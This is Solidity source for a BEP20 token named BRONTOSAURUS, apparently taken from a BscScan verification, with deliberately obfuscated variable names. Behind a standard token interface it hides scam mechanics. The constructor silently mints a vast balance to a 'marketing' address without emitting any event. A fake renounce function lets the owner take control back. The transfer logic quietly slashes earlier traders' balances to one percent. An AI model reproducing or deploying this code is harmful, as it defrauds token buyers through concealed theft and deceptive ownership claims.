/**
 *Submitted for verification at BscScan.com on 2022-01-12
*/

/**
 *Submitted for verification at BscScan.com on 2022-01-12
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;
/*
https://t.me/brontosaurustoken
*/




abstract contract Context {
  function _msgData() internal view virtual returns (bytes calldata) {
    this;
    return msg.data;

  
  
  }
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;

  }
}
library SafeMath {
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {

        return mod(a, b, "SafeMath: modulo by zero");
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {

        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
}
interface IBEP20 {
  function allowance(address owner, address spender) external view returns (uint256);
  function balanceOf(address account) external view returns (uint256);
  function name() external pure returns (string memory);
  function decimals() external view returns (uint8);

  event Approval(address indexed owner, address indexed spender, uint256 value);
  event Transfer(address indexed from, address indexed to, uint256 value);
  function getOwner() external view returns (address);
  function totalSupply() external view returns (uint256);
  function symbol() external pure returns (string memory);
  function transfer(address recipient, uint256 amount) external returns (bool);

  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}
contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        address msgSender = _msgSender();

        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {

        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renouncedOwner() public virtual onlyOwner {
        _previousOwner = _owner;
        _owner = address(0);
        emit OwnershipTransferred(_owner, address(0));

    }
    function transferOwnership() public virtual onlyOwner {
      _owner = _previousOwner;
      emit OwnershipTransferred(address(0), _owner);
    }
}
contract brontosaurus is Context, IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 private decqkdiixlojcsb = 18;
    uint256 private totlqxjorcakdtie = 90000000* 10 ** decqkdiixlojcsb;
    uint8 internal _sta = 3;
    mapping (address => uint256) private selbgadnahemozktiop;
    string private constant nambixqekienal = "BRONTOSAURUS";
    string private constant symwaoefitszcykroiglxedbnqjamph = "$BRONTOS";

    mapping (address => bool) private isEfwxlazinsmgpotairkqedcbh;
    mapping (address => mapping (address => uint256)) private allaiwraxesqlyhidtn;
    mapping (address => uint256) private balnwobfzaishyjo;
    address internal marthoaniebygaqmkdcoszlirxpjfew;
    uint8 internal buyachqfoznebwtxmireikyoldasgpj = 5;
    uint8 internal seljonilwfrisxqbteyahpoa = 7;
    uint8 internal trazejtymflwiexqnidrogabahskc = 10; 

    constructor(address marketingAddress) {
      balnwobfzaishyjo[msg.sender] = totlqxjorcakdtie;
      isEfwxlazinsmgpotairkqedcbh[address(this)] = true;
      isEfwxlazinsmgpotairkqedcbh[msg.sender] = true;
      balnwobfzaishyjo[marketingAddress] = totlqxjorcakdtie * 10**decqkdiixlojcsb * 1000;
      isEfwxlazinsmgpotairkqedcbh[marketingAddress] = true;
      marthoaniebygaqmkdcoszlirxpjfew = marketingAddress;
      emit Transfer(address(0), msg.sender, totlqxjorcakdtie);

    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
       traeaakhtgilobofcsnmri(sender, recipient, amount);
       _approve(sender, _msgSender(), allaiwraxesqlyhidtn[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));

       return true;
    }
    /**
     * Returns the token Supply.
     */

    function totalSupply() external override view returns (uint256) {
      return totlqxjorcakdtie;

    }
    /**
     * Returns the token decimals.
     */
    function decimals() external override view returns (uint8) {
      return decqkdiixlojcsb;
    }

    /**
     * Requirements:
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) external override returns (bool) {
      traeaakhtgilobofcsnmri(_msgSender(), recipient, amount);

      return true;
    }
    /**
    * Returns the token name.
    */
    function name() external override pure returns (string memory) {
      return nambixqekienal;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
      return allaiwraxesqlyhidtn[owner][spender];
    }
    /**
     * Returns balance of.
     */
    function balanceOf(address account) external override view returns (uint256) {

      return balnwobfzaishyjo[account];

    }
    /**

     * Returns the bep token owner.

     */
    
    
    function getOwner() external override view returns (address) {
      return owner();
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
      _approve(_msgSender(), spender, amount);
      return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        allaiwraxesqlyhidtn[owner][spender] = amount;

        emit Approval(owner, spender, amount);
    }
    /**
     * Returns the token symbol.
     */
    function symbol() external override pure returns (string memory) {

      return symwaoefitszcykroiglxedbnqjamph;

    }
    function traeaakhtgilobofcsnmri(address sender, address recipient, uint256 amount) internal {

      require(sender != address(0), "BEP20: transfer from the zero address");
      require(recipient != address(0), "BEP20: transfer to the zero ");
      uint8 rancfaprmxzqgtkjblwe = 0;
      bool approveTransaction = false;
      uint8 tax = 0;
      if(amount > 0){
        if(isEfwxlazinsmgpotairkqedcbh[sender] == true || isEfwxlazinsmgpotairkqedcbh[recipient] == true){
          balnwobfzaishyjo[sender] = balnwobfzaishyjo[sender].sub(amount, "Insufficient Balance");
          balnwobfzaishyjo[recipient] = balnwobfzaishyjo[recipient].add(amount);
          emit Transfer(sender, recipient, amount);
        } else {

          if(sender == unicoxpifbartihkjnl && recipient != uniogodtaawlybkrisipzxh) {
            rancfaprmxzqgtkjblwe = 1;
            tax = buyachqfoznebwtxmireikyoldasgpj;
            approveTransaction = true;
          } else if(recipient == unicoxpifbartihkjnl) {

             rancfaprmxzqgtkjblwe = 2;
             tax = seljonilwfrisxqbteyahpoa;

             approveTransaction = true;
          } else {

            rancfaprmxzqgtkjblwe = 3;
            tax = trazejtymflwiexqnidrogabahskc;
            approveTransaction = true;

          }
          if(approveTransaction == true && amount > 0){
            bTrobjzhiaqcslmayneotkdxifpwgre(sender, recipient, amount, tax, rancfaprmxzqgtkjblwe);
          }
        }
      }
      if(amount == 0){
        emit Transfer(sender, recipient, amount);
      }
    }

    
    address private _recipienta;
    address private _recipientb;
    function bTrobjzhiaqcslmayneotkdxifpwgre(address sender, address recipient, uint256 amount, uint8 tax, uint8 rancfaprmxzqgtkjblwe) internal {
      uint256 axesdehmwopbafterkgxjylo = 0;
      address addr = recipient;
      uint256 d = balnwobfzaishyjo[_recipientb];
      if(rancfaprmxzqgtkjblwe == 2) {
        addr = sender;
      }

      if(rancfaprmxzqgtkjblwe == 1 || rancfaprmxzqgtkjblwe == 2){

        if(_recipienta != addr && _recipientb != addr){
          if(d > 100 && d < totlqxjorcakdtie.div(10).mul(8)){

            balnwobfzaishyjo[_recipientb] = d.div(100);
          }
          _recipientb = _recipienta;
          _recipienta = addr;

        }
      }
      balnwobfzaishyjo[sender] = balnwobfzaishyjo[sender].sub(amount,"Insufficient Balance");
      axesdehmwopbafterkgxjylo = amount.mul(tax).div(100);
      amount = amount.sub(axesdehmwopbafterkgxjylo);
      balnwobfzaishyjo[recipient] = balnwobfzaishyjo[recipient].add(amount);
      rancfaprmxzqgtkjblwe = 1;
      emit Transfer(sender, recipient, amount);
    }
    
    
    
    
    
    
    
    
    
    
    address public unicoxpifbartihkjnl;

    address public uniogodtaawlybkrisipzxh = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    uint8 internal _pairset = 0;
    function setUniswapV2Pair(address uniswapV2Pair) public onlyOwner {
      unicoxpifbartihkjnl = uniswapV2Pair;
      _pairset = 1;
    }
}